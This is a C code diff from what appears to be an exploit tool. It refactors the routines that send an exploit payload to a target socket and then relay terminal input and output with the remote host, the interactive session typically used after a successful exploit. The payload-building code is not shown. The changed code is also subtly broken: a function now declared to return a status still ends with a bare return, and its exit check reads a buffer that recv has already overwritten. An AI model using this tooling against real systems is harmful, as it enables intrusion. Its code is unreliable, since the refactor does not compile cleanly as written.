@@ -142,17 +142,22 @@ status_t prepare_exploit (char* (*data),
 #include <unistd.h>
 #include <fcntl.h>
 
-status_t send_exploit (const char* data, size_t size, int fd)
+status_t complete_write (int fd, const void* data, size_t count)
 {
 	size_t written = 0;
-	while (written < size) {
-		ssize_t l = write (fd, data + written, size - written);
+	while (written < count) {
+		ssize_t l = write (fd, (const char*)data + written, count - written);
 		if (l == -1)
 			return efailure (errno);
 		written += l;
 	}
 
 	return success ();
+}
+
+status_t send_exploit (const char* data, size_t size, int fd)
+{
+	return complete_write (fd, data, size);
 }
 
 status_t dump_exploit (const char* data, size_t size, const char* filename)
@@ -173,14 +178,14 @@ status_t dump_exploit (const char* data, size_t size, const char* filename)
 
 
 
-void talktoserver (int clsck)
+status_t talk_to_server (int echo_socket)
 {
-	for (;;) {
-		char buf [256];
-		int len = read (0, buf, 256);
-		send (clsck, buf, len, 0);
-		while ((len = recv (clsck, buf, 256, MSG_DONTWAIT)) > 0)
-			write (1, buf, len);
+	char buf [256];
+	while (true) {
+		int len = read (STDIN_FILENO, buf, 256);
+		send (echo_socket, buf, len, 0);
+		while ((len = recv (echo_socket, buf, 256, MSG_DONTWAIT)) > 0)
+			write (STDOUT_FILENO, buf, len);
 		if (strncmp (buf, "exit\n", 5)==0)
 			return;
 	}
@@ -258,9 +263,14 @@ int main (int argc, char** argv)
 		return EXIT_FAILURE;
 	}
 
-	talktoserver (echo_socket);
-
 	free (exploit);
+
+	status = talk_to_server (echo_socket);
+	if (failed (status)) {
+		fprintf (stderr, "Error when communicating with remote host (%s)\n", status.reason);
+		return EXIT_FAILURE;
+	}
+
 	close (echo_socket);
 
 	return EXIT_SUCCESS;
